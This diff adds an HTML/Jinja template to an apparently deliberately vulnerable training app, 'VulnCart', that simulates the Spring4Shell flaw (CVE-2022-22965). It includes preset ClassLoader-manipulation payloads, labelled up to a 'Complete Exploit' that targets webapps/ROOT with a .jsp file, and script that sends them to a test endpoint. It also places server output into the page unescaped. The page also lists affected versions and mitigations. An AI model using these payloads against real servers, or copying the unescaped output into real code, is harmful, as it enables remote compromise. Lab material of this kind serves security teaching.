@@ -1,0 +1,191 @@
+{% extends "base.html" %}
+
+{% block title %}Spring4Shell Test - VulnCart{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-12">
+        <h2>CVE-2022-22965: Spring4Shell Vulnerability Test</h2>
+        <div class="alert alert-danger">
+            <strong>Critical:</strong> This page simulates the Spring4Shell vulnerability (CVE-2022-22965) for educational purposes.
+        </div>
+    </div>
+</div>
+
+<div class="row">
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h4>Spring4Shell Exploitation</h4>
+            </div>
+            <div class="card-body">
+                <p>Spring4Shell (CVE-2022-22965) is a critical vulnerability in Spring Framework that allows remote code execution through ClassLoader manipulation.</p>
+                
+                <form method="POST" id="spring4shellForm">
+                    <div class="mb-3">
+                        <label for="payload" class="form-label">Spring4Shell Payload (JSON):</label>
+                        <textarea class="form-control" id="payload" name="payload" rows="6" 
+                                  placeholder="Enter Spring4Shell payload here...">{"class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%d{yyyy-MM-dd HH:mm:ss} - %msg%n","class.module.classLoader.resources.context.parent.pipeline.first.directory":"webapps/ROOT","class.module.classLoader.resources.context.parent.pipeline.first.prefix":"cmd","class.module.classLoader.resources.context.parent.pipeline.first.suffix":".jsp","class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat":"yyyy-MM-dd"}</textarea>
+                    </div>
+                    
+                    <button type="submit" class="btn btn-danger">Test Spring4Shell</button>
+                </form>
+                
+                <div id="result" class="mt-3"></div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5>Sample Payloads</h5>
+            </div>
+            <div class="card-body">
+                <h6>ClassLoader Manipulation:</h6>
+                <code>{"class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%d{yyyy-MM-dd HH:mm:ss} - %msg%n"}</code>
+                
+                <hr>
+                
+                <h6>File Upload:</h6>
+                <code>{"class.module.classLoader.resources.context.parent.pipeline.first.directory":"webapps/ROOT"}</code>
+                
+                <hr>
+                
+                <h6>JSP File Creation:</h6>
+                <code>{"class.module.classLoader.resources.context.parent.pipeline.first.suffix":".jsp"}</code>
+                
+                <hr>
+                
+                <h6>Complete Payload:</h6>
+                <small>See the textarea for a complete exploitation payload</small>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="row mt-4">
+    <div class="col-12">
+        <div class="card">
+            <div class="card-header">
+                <h5>CVE-2022-22965 Details</h5>
+            </div>
+            <div class="card-body">
+                <h6>Vulnerability Description:</h6>
+                <p>Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions are vulnerable to remote code execution through ClassLoader manipulation.</p>
+                
+                <h6>Prerequisites:</h6>
+                <ul>
+                    <li>Spring Framework 5.3.0 to 5.3.17 or 5.2.0 to 5.2.19</li>
+                    <li>JDK 9+ (due to ClassLoader changes)</li>
+                    <li>Application using @RequestMapping or @GetMapping</li>
+                    <li>Request parameter binding to a POJO</li>
+                </ul>
+                
+                <h6>Impact:</h6>
+                <ul>
+                    <li>Remote Code Execution (RCE)</li>
+                    <li>File upload and execution</li>
+                    <li>Complete system compromise</li>
+                    <li>Data exfiltration</li>
+                </ul>
+                
+                <h6>Affected Versions:</h6>
+                <ul>
+                    <li>Spring Framework 5.3.0 to 5.3.17</li>
+                    <li>Spring Framework 5.2.0 to 5.2.19</li>
+                    <li>Spring Boot applications using affected Spring versions</li>
+                </ul>
+                
+                <h6>Mitigation:</h6>
+                <ul>
+                    <li>Update to Spring Framework 5.3.18+ or 5.2.20+</li>
+                    <li>Update Spring Boot to 2.5.12+ or 2.6.6+</li>
+                    <li>Use @ControllerAdvice to restrict parameter binding</li>
+                    <li>Implement input validation and sanitization</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('spring4shellForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const payloadText = document.getElementById('payload').value;
+        const resultDiv = document.getElementById('result');
+        
+        let payload;
+        try {
+            payload = JSON.parse(payloadText);
+        } catch (error) {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> Invalid JSON format
+                </div>
+            `;
+            return;
+        }
+        
+        fetch('/spring4shell', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(payload)
+        })
+        .then(response => response.json())
+        .then(data => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-info">
+                    <strong>Result:</strong> ${data.result}
+                </div>
+            `;
+        })
+        .catch(error => {
+            resultDiv.innerHTML = `
+                <div class="alert alert-danger">
+                    <strong>Error:</strong> ${error}
+                </div>
+            `;
+        });
+    });
+    
+    // Quick payload buttons
+    const payloads = [
+        {
+            name: "Basic ClassLoader",
+            payload: {"class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%d{yyyy-MM-dd HH:mm:ss} - %msg%n"}
+        },
+        {
+            name: "File Upload",
+            payload: {"class.module.classLoader.resources.context.parent.pipeline.first.directory":"webapps/ROOT"}
+        },
+        {
+            name: "JSP Extension",
+            payload: {"class.module.classLoader.resources.context.parent.pipeline.first.suffix":".jsp"}
+        },
+        {
+            name: "Complete Exploit",
+            payload: {
+                "class.module.classLoader.resources.context.parent.pipeline.first.pattern":"%d{yyyy-MM-dd HH:mm:ss} - %msg%n",
+                "class.module.classLoader.resources.context.parent.pipeline.first.directory":"webapps/ROOT",
+                "class.module.classLoader.resources.context.parent.pipeline.first.prefix":"cmd",
+                "class.module.classLoader.resources.context.parent.pipeline.first.suffix":".jsp",
+                "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat":"yyyy-MM-dd"
+            }
+        }
+    ];
+    
+    payloads.forEach((item, index) => {
+        const button = document.createElement('button');
+        button.className = 'btn btn-outline-secondary btn-sm me-2 mb-2';
+        button.textContent = item.name;
+        button.onclick = () => {
+            document.getElementById('payload').value = JSON.stringify(item.payload, null, 2);
+        };
+        document.querySelector('.card-body').appendChild(button);
+    });
+</script>
+{% endblock %} 
